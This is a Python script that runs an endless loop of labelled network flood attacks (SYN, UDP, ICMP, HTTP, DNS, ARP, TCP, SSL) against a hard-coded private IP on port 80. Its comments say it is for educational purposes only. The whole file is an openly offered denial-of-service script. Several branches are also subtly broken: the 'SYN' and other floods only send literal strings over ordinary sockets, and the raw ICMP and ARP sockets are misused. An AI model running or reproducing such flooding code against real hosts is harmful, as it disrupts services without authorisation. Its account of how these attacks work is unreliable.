import socket
import random

target_ip = '192.168.17.131'
target_port = 80


# simulate many different network attacks 
# NOTICE: This code is for educational purposes only. Do not use it for malicious activities.
# This code is for educational purposes only. Do not use it for malicious activities.
def simulate_attack():
    attack_type = random.choice(['SYN', 'UDP', 'ICMP', 'HTTP', 'DNS', 'ARP', 'TCP', 'SSL'])
    print(f"Simulating {attack_type} attack on {target_ip}:{target_port}")

    try:
        if attack_type == 'SYN':
            print("Simulating SYN flood attack")
            # Code to simulate SYN flood attack
            # Create a socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Set socket options
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Set the timeout
            sock.settimeout(1)
            # Connect to the target
            sock.connect((target_ip, target_port))
            # Send SYN packets
            for i in range(100):
                sock.sendto(b'SYN', (target_ip, target_port))
                print(f"Sent SYN packet {i+1} to {target_ip}:{target_port}")

        elif attack_type == 'UDP':
            print("Simulating UDP flood attack")
            # Code to simulate UDP flood attack
            # Create a socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Set socket options
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            # Set the timeout
            sock.settimeout(1)
            # Send UDP packets
            for i in range(100):
                sock.sendto(b'UDP', (target_ip, target_port))
                print(f"Sent UDP packet {i+1} to {target_ip}:{target_port}")

        elif attack_type == 'ICMP':
            print("Simulating ICMP flood attack")
            # Code to simulate ICMP flood attack
            # Create a socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname('icmp'))
            # Set socket options
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            # Set the timeout
            sock.settimeout(1)
            # Send ICMP packets
            for i in range(100):
                sock.sendto(b'ICMP', (target_ip, target_port))
                print(f"Sent ICMP packet {i+1} to {target_ip}:{target_port}")   

        elif attack_type == 'HTTP':
            print("Simulating HTTP flood attack")
            # Code to simulate HTTP flood attack
            # Create a socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Set socket options
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Set the timeout
            sock.settimeout(1)
            # Connect to the target
            sock.connect((target_ip, target_port))
            # Send HTTP GET requests
            for i in range(100):
                sock.sendto(b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n', (target_ip, target_port))
                print(f"Sent HTTP GET request {i+1} to {target_ip}:{target_port}")

        elif attack_type == 'DNS':
            print("Simulating DNS flood attack")
            # Code to simulate DNS flood attack
            # Create a socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Set socket options
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            # Set the timeout
            sock.settimeout(1)
            # Send DNS packets
            for i in range(100):
                sock.sendto(b'DNS', (target_ip, target_port))
                print(f"Sent DNS packet {i+1} to {target_ip}:{target_port}")

        elif attack_type == 'ARP':
            print("Simulating ARP flood attack")
            # Code to simulate ARP flood attack
            # Create a socket
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
            # Set the timeout
            sock.settimeout(1)
            # Send ARP packets
            for i in range(100):
                sock.sendto(b'ARP', (target_ip, target_port))
                print(f"Sent ARP packet {i+1} to {target_ip}:{target_port}")

        elif attack_type == 'TCP':  
            print("Simulating TCP flood attack")
            # Code to simulate TCP flood attack
            # Create a socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Set socket options
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Set the timeout
            sock.settimeout(1)
            # Connect to the target
            sock.connect((target_ip, target_port))
            # Send TCP packets
            for i in range(100):
                sock.sendto(b'TCP', (target_ip, target_port))
                print(f"Sent TCP packet {i+1} to {target_ip}:{target_port}")

        elif attack_type == 'SSL':  
            print("Simulating SSL flood attack")
            # Code to simulate SSL flood attack
            # Create a socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Set socket options
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Set the timeout
            sock.settimeout(1)
            # Connect to the target
            sock.connect((target_ip, target_port))
            # Send SSL packets
            for i in range(100):
                sock.sendto(b'SSL', (target_ip, target_port))
                print(f"Sent SSL packet {i+1} to {target_ip}:{target_port}")
        else:
            print("Unknown attack type")
            return

        sock.close()

    except ConnectionRefusedError:
        print(f"Connection refused for {attack_type} attack on {target_ip}:{target_port}. Continuing...")
    except Exception as e:
        print(f"An error occurred: {e}. Continuing...")

while True:
    # Run the attack simulation
    for i in range(8):
        simulate_attack()
        print(f"Attack {i+1} completed")
    print("All attacks completed")

